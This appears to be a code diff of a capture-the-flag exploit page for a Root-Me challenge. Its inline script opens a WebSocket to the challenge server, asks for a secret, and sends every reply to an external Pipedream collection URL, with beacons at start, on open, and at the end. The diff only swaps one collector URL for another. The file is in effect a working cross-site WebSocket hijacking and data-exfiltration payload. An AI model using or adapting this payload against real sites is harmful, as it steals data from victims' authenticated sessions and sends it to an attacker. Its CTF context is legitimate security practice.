@@ -2,18 +2,18 @@
 <html>
   <body>
     <script>
-      fetch('https://eo4mg2uuwtytyew.m.pipedream.net/start');
+      fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/start');
       const ws = new WebSocket('ws://ctf20.root-me.org/ws');
 
       ws.addEventListener('open', () => {
-        fetch('https://eo4mg2uuwtytyew.m.pipedream.net/ws-opened');
+        fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
         ws.send("Tell me a secret");
       });
 
       ws.addEventListener('message', (event) => {
-        fetch('https://eo4mg2uuwtytyew.m.pipedream.net/leak?' + encodeURIComponent(event.data));
+        fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data));
       });
-      fetch('https://eo4mg2uuwtytyew.m.pipedream.net/end');
+      fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/end');
     </script>
   </body>
 </html>
